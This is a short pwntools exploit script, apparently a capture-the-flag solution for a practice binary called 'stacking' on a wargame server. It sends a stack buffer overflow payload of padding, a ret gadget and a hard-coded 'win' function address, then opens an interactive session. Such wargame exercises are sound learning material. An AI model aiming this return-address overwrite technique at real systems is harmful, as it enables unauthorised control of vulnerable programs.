from pwn import * 

elf = ELF('./stacking')
context.log_level = 'debug'

if args['REMOTE']:
    p = remote('pwnable.co.il', 9009)
   
else: 
    p = process([elf.path])
    gdb.attach(p, gdbscript='b main')
    pause()
    

offset_padding = ((0x7ffffcf223f0 - 0x7ffffcf223e8) * 7) * b'\x00'
win_address = p64(0x04012e5) 
ret = p64(0x0401479)

payload = offset_padding + ret + win_address







 
p.recvuntil(':')
p.sendline(payload)
p.interactive()

        